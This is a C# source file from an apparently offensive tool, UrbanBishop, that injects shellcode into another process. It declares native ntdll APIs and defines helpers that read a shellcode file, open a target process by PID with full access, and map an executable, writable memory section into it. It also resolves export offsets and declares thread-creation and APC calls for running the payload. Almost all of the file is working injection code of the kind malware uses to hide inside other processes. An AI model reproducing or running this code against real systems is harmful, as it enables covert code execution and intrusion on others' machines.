using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace UrbanBishop
{
    class BerlinDefence
    {
        // Structs
        //-----------------------------------
        [StructLayout(LayoutKind.Sequential)]
        public struct PROC_VALIDATION
        {
            public Boolean isvalid;
            public String sName;
            public IntPtr hProc;
            public IntPtr pNtllBase;
            public Boolean isWow64;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SC_DATA
        {
            public UInt32 iSize;
            public byte[] bScData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ANSI_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class THREAD_BASIC_INFORMATION
        {
            public UInt32 ExitStatus;
            public IntPtr TebBaseAddress;
            public CLIENT_ID ClientId;
            public UIntPtr AffinityMask;
            public int Priority;
            public int BasePriority;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public Int32 Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        // APIs
        //-----------------------------------
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtOpenProcess(
            ref IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtQueryInformationProcess(
            IntPtr processHandle,
            UInt32 processInformationClass,
            ref ulong processInformation,
            int processInformationLength,
            ref UInt32 returnLength);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtUnmapViewOfSection(
            IntPtr ProcessHandle,
            IntPtr BaseAddress);

        // Not used but for ref in case of
        // NtOpenThread -> NtQueueApcThread
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtOpenThread(
             IntPtr ThreadHandle,
             UInt32 DesiredAccess,
             ref OBJECT_ATTRIBUTES ObjectAttributes,
             IntPtr ClientId);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtQueueApcThread(
             IntPtr ThreadHandle,
             IntPtr ApcRoutine,
             IntPtr ApcArgument1,
             IntPtr ApcArgument2,
             IntPtr ApcArgument3);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateThreadEx(
            ref IntPtr hThread,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            UInt32 StackZeroBits,
            UInt32 SizeOfStackCommit,
            UInt32 SizeOfStackReserve,
            IntPtr lpBytesBuffer);

        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(
            ref UNICODE_STRING DestinationString,
            [MarshalAs(UnmanagedType.LPWStr)]
            string SourceString);

        [DllImport("ntdll.dll")]
        public static extern UInt32 RtlUnicodeStringToAnsiString(
            ref ANSI_STRING DestinationString,
            ref UNICODE_STRING SourceString,
            bool AllocateDestinationString);

        [DllImport("ntdll.dll")]
        public static extern UInt32 LdrGetDllHandle(
            IntPtr DllPath,
            IntPtr DllCharacteristics,
            ref UNICODE_STRING DllName,
            ref IntPtr DllHandle);

        [DllImport("ntdll.dll")]
        public static extern UInt32 LdrGetProcedureAddress(
            IntPtr hModule,
            ref ANSI_STRING ModName,
            UInt32 Ordinal,
            ref IntPtr FunctionAddress);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtAlertResumeThread(
            IntPtr ThreadHandle,
            ref UInt32 PreviousSuspendCount);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtQueryInformationThread(
            IntPtr ThreadHandle,
            int ThreadInformationClass,
            IntPtr ThreadInformation,
            int ThreadInformationLength,
            ref int ReturnLength);

        // Helpers
        //-----------------------------------
        public static void GetHelp()
        {
            Console.WriteLine("[!] Missing arguments..\n");
            Console.WriteLine("    -p (--Path)        Full path to the shellcode binary file");
            Console.WriteLine("    -i (--Inject)      PID to inject");
            Console.WriteLine("    -c (--Clean)       Optional, wait for payload to exit and clean up");
        }

        // Banner
        //-----------------------------------
        public static void PrintBanner()
        {
            Console.WriteLine("   _O       _____     _                  ");
            Console.WriteLine("  / //\\    |  |  |___| |_ ___ ___       ");
            Console.WriteLine(" {     }   |  |  |  _| . | .'|   |       ");
            Console.WriteLine("  \\___/    |_____|_| |___|__,|_|_|      ");
            Console.WriteLine("  (___)                                  ");
            Console.WriteLine("   |_|          _____ _     _            ");
            Console.WriteLine("  /   \\        | __  |_|___| |_ ___ ___ ");
            Console.WriteLine(" (_____)       | __ -| |_ -|   | . | . | ");
            Console.WriteLine("(_______)      |_____|_|___|_|_|___|  _| ");
            Console.WriteLine("/_______\\                          |_|  ");
            Console.WriteLine("                       ~b33f~          \n");
        }

        public static Boolean PathIsFile(String Path)
        {
            try
            {
                FileAttributes CheckAttrib = File.GetAttributes(Path);
                if ((CheckAttrib & FileAttributes.Directory) == FileAttributes.Directory)
                {
                    Console.WriteLine("[!] Please specify a file path not a folder path (-p|--Path)");
                    return false;
                }
            } catch
            {
                Console.WriteLine("[!] Invalid shellcode bin file path specified (-p|--Path)");
                return false;
            }
            return true;
        }

        public static IntPtr GetProcessHandle(Int32 ProcId)
        {
            IntPtr hProc = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci = new CLIENT_ID();
            ci.UniqueProcess = (IntPtr)ProcId;
            UInt32 CallResult = NtOpenProcess(ref hProc, 0x1F0FFF, ref oa, ref ci);
            return hProc;
        }

        public static PROC_VALIDATION ValidateProc(Int32 ProcId)
        {
            PROC_VALIDATION Pv = new PROC_VALIDATION();

            try
            {
                Process Proc = Process.GetProcessById(ProcId);
                ProcessModuleCollection ProcModColl = Proc.Modules;
                foreach (ProcessModule Module in ProcModColl)
                {
                    if (Module.FileName.EndsWith("ntdll.dll"))
                    {
                        Pv.pNtllBase = Module.BaseAddress;
                    }
                }
                Pv.isvalid = true;
                Pv.sName = Proc.ProcessName;
                Pv.hProc = GetProcessHandle(ProcId);
                ulong isWow64 = 0;
                uint RetLen = 0;
                NtQueryInformationProcess(Pv.hProc, 26, ref isWow64, Marshal.SizeOf(isWow64), ref RetLen);
                if (isWow64 == 0)
                {
                    Pv.isWow64 = false;
                } else
                {
                    Pv.isWow64 = true;
                }
            }
            catch
            {
                Pv.isvalid = false;
            }

            return Pv;
        }

        public static SC_DATA ReadShellcode(String Path)
        {
            SC_DATA scd = new SC_DATA();
            try
            {
                scd.bScData = File.ReadAllBytes(Path);
                scd.iSize = (uint)scd.bScData.Length;
            } catch { }

            return scd;
        }

        public static SECT_DATA MapLocalSection(long ScSize)
        {
            SECT_DATA SectData = new SECT_DATA();

            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
                Console.WriteLine("    |-> Size: " + ScSize);
                SectData.hSection = hSection;
            } else
            {
                Console.WriteLine("[!] Failed to create section..");
                SectData.isvalid = false;
                return SectData;
            }

            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
                SectData.pBase = pScBase;
            } else
            {
                Console.WriteLine("[!] Failed to map section locally..");
                SectData.isvalid = false;
                return SectData;
            }

            SectData.isvalid = true;
            return SectData;
        }

        public static SECT_DATA MapRemoteSection(IntPtr hProc, IntPtr hSection, long ScSize)
        {
            SECT_DATA SectData = new SECT_DATA();

            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            long MaxSize = ScSize;
            UInt32 CallResult = NtMapViewOfSection(hSection, hProc, ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                Console.WriteLine("    |-> pRemoteBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
                SectData.pBase = pScBase;
            }
            else
            {
                Console.WriteLine("[!] Failed to map section in remote process..");
                SectData.isvalid = false;
                return SectData;
            }

            SectData.isvalid = true;
            return SectData;
        }

        public static IntPtr GetLocalExportOffset(String Module, String Export)
        {
            UNICODE_STRING uModuleName = new UNICODE_STRING();
            RtlInitUnicodeString(ref uModuleName, Module);
            IntPtr hModule = IntPtr.Zero;
            UInt32 CallResult = LdrGetDllHandle(IntPtr.Zero, IntPtr.Zero, ref uModuleName, ref hModule);
            if (CallResult != 0 || hModule == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to get " + Module + " handle..");
                return IntPtr.Zero;
            } else
            {
                Console.WriteLine("    |-> LdrGetDllHandle OK");
            }

            // Hey MSFT, why is RtlInitAnsiString not working on Win7..?
            UNICODE_STRING uFuncName = new UNICODE_STRING();
            RtlInitUnicodeString(ref uFuncName, Export);
            ANSI_STRING aFuncName = new ANSI_STRING();
            RtlUnicodeStringToAnsiString(ref aFuncName, ref uFuncName, true);
            IntPtr pExport = IntPtr.Zero;
            CallResult = LdrGetProcedureAddress(hModule, ref aFuncName, 0, ref pExport);
            
            if (CallResult != 0 || pExport == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to get " + Export + " address..");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("    |-> " + Export + ": 0x" + String.Format("{0:X}", (pExport).ToInt64()));
            }

            IntPtr FuncOffset = (IntPtr)((Int64)(pExport) - (Int64)(hModule));
            Console.WriteLine("    |-> Offset: 0x" + String.Format("{0:X}", (FuncOffset).ToInt64()));

            return FuncOffset;
        }

        public static THREAD_BASIC_INFORMATION GetThreadState(IntPtr hThread)
        {
            THREAD_BASIC_INFORMATION ts = new THREAD_BASIC_INFORMATION();
            IntPtr BuffPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ts));
            int RetLen = 0;
            UInt32 CallResult = NtQueryInformationThread(hThread, 0, BuffPtr, Marshal.SizeOf(ts), ref RetLen);
            if (CallResult != 0)
            {
                Console.WriteLine("[!] Failed to query thread information..");
                return ts;
            }

            // Ptr to struct
            ts = (THREAD_BASIC_INFORMATION)Marshal.PtrToStructure(BuffPtr, typeof(THREAD_BASIC_INFORMATION));

            return ts;
        }
    }
}
